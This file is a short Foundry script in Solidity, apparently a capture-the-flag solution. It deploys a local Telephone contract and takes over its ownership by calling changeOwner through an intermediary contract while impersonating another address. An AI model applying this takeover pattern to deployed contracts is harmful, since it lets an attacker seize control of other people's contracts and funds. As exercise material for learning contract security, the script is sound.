// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/Telephone.sol";

contract TelephoneHack is Script {
    Telephone public telephone;
    address public constant eoa = address(1024);

    function run() public {
        telephone = new Telephone();

        console.log(telephone.owner());

        vm.startPrank(eoa);
        this.telephone().changeOwner(eoa);
        vm.stopPrank();

        console.log(telephone.owner());
    }
}
